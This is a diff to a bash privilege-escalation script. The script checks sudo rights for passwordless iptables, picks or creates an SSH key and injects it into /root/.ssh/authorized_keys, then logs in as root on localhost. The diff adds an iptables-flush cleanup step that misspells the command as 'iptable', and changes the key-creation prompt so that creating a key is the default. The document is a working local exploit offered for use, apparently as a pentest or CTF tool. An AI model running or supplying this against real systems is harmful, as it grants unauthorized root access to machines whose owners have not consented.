@@ -7,7 +7,7 @@ banner() {
 }
 initsudo() {
     init=$(sudo -l)
-    if echo "$init" | grep -q "NOPASSWD: /usr/sbin/iptables\|NOPASSWD: /usr/sbin/iptables"; then
+    if echo "$init" | grep -Eq '(NOPASSWD: /usr/sbin/iptables|NOPASSWD: /usr/sbin/iptables)'; then
         echo "[+] Target might be vulnerable"
     elif echo "$init" | grep -q "NOPASSWD: ALL"; then
         echo "[!] $USER has NOPASSWD: ALL privilege"
@@ -27,12 +27,10 @@ listKeys() {
     out=$(find ~ -type f -name "*.pub" 2>/dev/null)
     if [ -z "$out" ]; then
         echo -e "[-]\tNone"
-        echo -en "[?] Create a new SSH key? (y/N): "
+        echo -en "[?] Create a new SSH key? (Y/n): "
         read -srn1 answer; echo ""
-        if [[ "$answer" =~ ^[Yy]$ ]]; then
+        if [[ "$answer" =~ ^[Yy]$ ]] || [ -z "$answer" ]; then
             makeKey
-        else
-            echo "[*] continuing..."
         fi
     else
         echo "$out" | while read -r key; do
@@ -87,8 +85,19 @@ inject_save() {
         ssh -i "$privkey" root@127.0.0.1
     fi
 }
+cleanUpOption() {
+    echo -n "[?] Flush iptable? (Y/n): "
+    read -srn1 answer; echo ""
+    if [[ "$answer" =~ ^[Yy]$ ]] || [ -z "$answer" ]; then
+        sudo iptable -F && echo "[*] Flushed iptable successfully."
+        exit 0
+    else
+        echo "[*] Exiting."
+        exit 0
+    fi
+}
 PrivEsc() {
-    echo "[!] Starting PrivEsc."
+    echo "[*] Starting PrivEsc."
     if [ $targetfile = "/root/.ssh/authorized_keys" ]; then
         initssh=true
         inject_save 2>/dev/null
@@ -103,4 +112,5 @@ listKeys
 chooseKey
 chooseTarget
 PrivEsc
+cleanUpOption
 # Will try to remove the " at the end of the injection but it still works as is.
